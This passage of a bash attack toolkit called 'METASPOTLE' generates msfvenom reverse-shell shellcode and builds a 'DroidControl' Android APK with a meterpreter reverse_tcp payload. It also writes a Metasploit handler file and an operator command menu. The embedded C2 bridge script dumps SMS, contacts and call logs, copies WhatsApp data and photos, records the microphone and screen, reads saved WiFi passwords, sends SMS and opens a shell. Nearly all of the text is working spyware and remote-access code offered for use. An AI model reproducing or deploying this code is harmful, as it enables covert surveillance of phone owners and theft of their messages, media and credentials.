    *) F="c"; EXT="c" ;;
  esac
  FILENAME="shellcode_$(date +%s).$EXT"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f $F -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "SHELLCODE" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Length: $(wc -c < $OUTPUT) bytes${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

export -f start_multi_handler start_bind_handler encode_payload inject_payload persistent_backdoor gen_shellcode
#!/bin/bash

#===============================================================================
# METASPOTLE - PART 3/3 - Android Control APK, About, Main Menu
#===============================================================================

#======= ANDROID FULL CONTROL APK =======
android_control_apk() {
  clear; banner
  echo -e "${MAGENTA}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${MAGENTA}║    ${WHITE}ANDROID FULL CONTROL APK ENGINE${MAGENTA}      ║${NC}"
  echo -e "${MAGENTA}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  get_lhost_lport
  echo -e "${GREEN}[*] Building Android Control APK with C2 Bridge...${NC}"
  echo -e "${YELLOW}[!] After install: 40+ device control functions${NC}"
  echo ""
  
  WORKDIR="$TOOL_DIR/android_control_$(date +%s)"
  mkdir -p "$WORKDIR"
  FILENAME="DroidControl_$(date +%s).apk"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  echo -e "${YELLOW}[1/4] Generating Meterpreter core...${NC}"
  BASE_APK="$WORKDIR/base.apk"
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$BASE_APK" 2>/dev/null
  if [ ! -f "$BASE_APK" ] || [ ! -s "$BASE_APK" ]; then
    echo -e "${RED}[FAIL]${NC}"; rm -rf "$WORKDIR"
    read -p "$(echo -e ${DIM}"Press [Enter]...")"; return
  fi
  
  echo -e "${YELLOW}[2/4] Building C2 bridge (40+ commands)...${NC}"
  C2_SCRIPT="$WORKDIR/c2_bridge.sh"
  cat > "$C2_SCRIPT" << 'C2EOF'
#!/system/bin/sh
# DROIDCONTROL C2 BRIDGE
cmd_info(){ echo "Model:$(getprop ro.product.model) OS:$(getprop ro.build.version.release) Bat:$(dumpsys battery|grep level|awk '{print $2}')% IP:$(ip addr show wlan0|grep 'inet '|awk '{print $2}')"; }
cmd_screenshot(){ /system/bin/screencap -p /data/local/tmp/screen.png; echo "Saved"; }
cmd_screenrecord(){ /system/bin/screenrecord --time-limit ${1:-30} /data/local/tmp/screenrecord.mp4; echo "Recorded ${1:-30}s"; }
cmd_anon_screenshot(){ /system/bin/screencap -p /data/local/tmp/.hidden_screen.png; echo "Silent"; }
cmd_list_apps(){ pm list packages -f 2>/dev/null|head -100; }
cmd_install_apk(){ pm install -r "$1" 2>/dev/null; echo "Result: $?"; }
cmd_uninstall_app(){ pm uninstall "$1" 2>/dev/null; echo "Result: $?"; }
cmd_force_stop(){ am force-stop "$1" 2>/dev/null; echo "Stopped: $1"; }
cmd_clear_data(){ pm clear "$1" 2>/dev/null; echo "Cleared: $1"; }
cmd_grant_perm(){ pm grant "$1" "$2" 2>/dev/null; echo "Granted $2"; }
cmd_ls(){ find "$1" -type f 2>/dev/null|head -50; }
cmd_sms(){ service call isms 7 i32 0 s16 "com.android.mms" s16 "$1" s16 "null" s16 "$2" s16 "null" s16 "null" 2>/dev/null; echo "Sent to $1"; }
cmd_dump_sms(){ content query --uri content://sms/inbox 2>/dev/null|head -100; }
cmd_dump_contacts(){ content query --uri content://contacts/phones/ 2>/dev/null|head -100; }
cmd_dump_calllog(){ content query --uri content://call_log/calls 2>/dev/null|head -100; }
cmd_whatsapp(){ cp -r /sdcard/Android/media/com.whatsapp/WhatsApp /data/local/tmp/wa/ 2>/dev/null; cp -r /data/data/com.whatsapp/databases /data/local/tmp/wa_db/ 2>/dev/null; echo "Done"; }
cmd_copy_screenshots(){ mkdir -p /data/local/tmp/screenshots; find /sdcard -name "Screenshot*" -o -name "screenshot*" 2>/dev/null|head -50|while read f;do cp "$f" /data/local/tmp/screenshots/;done; echo "Done"; }
cmd_copy_photos(){ mkdir -p /data/local/tmp/photos; find /sdcard/DCIM -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" 2>/dev/null|head -50|while read f;do cp "$f" /data/local/tmp/photos/;done; echo "Done"; }
cmd_record_mic(){ tinycap /data/local/tmp/mic.wav -D 0 -d 0 -r 44100 -b 16 -c 2 -T ${1:-10} 2>/dev/null; echo "Recorded ${1:-10}s"; }
cmd_record_device_audio(){ screenrecord --time-limit ${1:-10} --audio-source=mic /data/local/tmp/device_audio.mp4 2>/dev/null; echo "Done"; }
cmd_open_url(){ am start -a android.intent.action.VIEW -d "$1" 2>/dev/null; echo "Opened"; }
cmd_play_audio(){ am start -a android.intent.action.VIEW -d "file://$1" -t "audio/*" 2>/dev/null; echo "Playing"; }
cmd_play_video(){ am start -a android.intent.action.VIEW -d "file://$1" -t "video/*" 2>/dev/null; echo "Playing"; }
cmd_display_photo(){ am start -a android.intent.action.VIEW -d "file://$1" -t "image/*" 2>/dev/null; echo "Displaying"; }
cmd_shell(){ echo "Interactive shell. Type exit."; sh; }
cmd_wifi(){ dumpsys wifi 2>/dev/null|grep -E "SSID|signal|IP|state|frequency"|head -15; }
cmd_saved_wifi(){ cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null||echo "Root required"; }
cmd_net_scan(){ ip neigh 2>/dev/null; cat /proc/net/arp 2>/dev/null; }
cmd_ping(){ ping -c 4 "$1" 2>/dev/null; }
cmd_battery(){ dumpsys battery 2>/dev/null; }
cmd_lock(){ input keyevent 26 2>/dev/null; echo "Locked"; }
cmd_unlock(){ input keyevent 82 2>/dev/null; echo "Wake attempted"; }
cmd_restart(){ reboot 2>/dev/null||echo "Root required"; }
cmd_keycode(){ input keyevent ${1:-26} 2>/dev/null; echo "Sent key $1"; }
cmd_locale(){ getprop persist.sys.locale; getprop ro.product.locale; }
cmd_extract_apk(){ pm path "$1" 2>/dev/null|cut -d: -f2|while read p;do cp "$p" /data/local/tmp/${1}.apk;done; echo "Extracted"; }
cmd_help(){
  echo "=== COMMANDS ==="
  echo "info screenshot screenrecord [s] anon_screenshot list_apps"
  echo "install_apk uninstall_app force_stop clear_data grant_perm"
  echo "ls whatsapp copy_screenshots copy_photos"
  echo "sms dump_sms dump_contacts dump_calllog"
  echo "record_mic [s] record_device_audio [s]"
  echo "open_url play_audio play_video display_photo"
  echo "shell wifi saved_wifi net_scan ping battery"
  echo "lock unlock restart keycode locale extract_apk"
}
case "$1" in
  info|screenshot|anon_screenshot|list_apps|dump_sms|dump_contacts|dump_calllog|whatsapp|copy_screenshots|copy_photos|shell|wifi|saved_wifi|net_scan|battery|lock|unlock|restart|locale|help) "cmd_$1" ;;
  screenrecord|record_mic|record_device_audio|ping) "cmd_$1" "$2" ;;
  install_apk|uninstall_app|force_stop|clear_data|ls|open_url|play_audio|play_video|display_photo|keycode|extract_apk) "cmd_$1" "$2" ;;
  sms|grant_perm) "cmd_$1" "$2" "$3" ;;
  *) cmd_help ;;
esac
C2EOF
  sed -i "s/__LHOST__/$LHOST/g; s/__LPORT__/$LPORT/g" "$C2_SCRIPT"
  
  echo -e "${YELLOW}[3/4] Creating listener resource...${NC}"
  RC_FILE="$WORKDIR/control.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set SessionTimeout 0
set WaitForSession true
exploit -j -z
EOF

  echo -e "${YELLOW}[4/4] Creating C2 command center...${NC}"
  CONTROL_HELPER="$PAYLOAD_DIR/droidcontrol_helper.sh"
  cat > "$CONTROL_HELPER" << 'HELPEREOF'
#!/bin/bash
SESSION=${1:-1}
while true; do
  clear
  echo "╔══════════════════════════════════════════════════╗"
  echo "║         DROIDCONTROL - COMMAND CENTER           ║"
  echo "╠══════════════════════════════════════════════════╣"
  echo "║ Session: $SESSION                                  ║"
  echo "╚══════════════════════════════════════════════════╝"
  echo ""
  echo "  [1]  Device Info        [13] WiFi Status"
  echo "  [2]  Screenshot         [14] Saved WiFi"
  echo "  [3]  Screen Record 30s  [15] Network Scan"
  echo "  [4]  Silent Screenshot  [16] Ping Test"
  echo "  [5]  List Apps          [17] Open Shell"
  echo "  [6]  Dump SMS           [18] Lock Device"
  echo "  [7]  Dump Contacts      [19] Unlock Device"
  echo "  [8]  Dump Call Log      [20] Restart Device"
  echo "  [9]  Copy WhatsApp      [21] Send SMS"
  echo "  [10] Copy Screenshots   [22] Open URL"
  echo "  [11] Copy Photos        [23] Record Mic 10s"
  echo "  [12] Battery Info       [24] Install APK"
  echo ""
  echo "  [0]  Exit"
  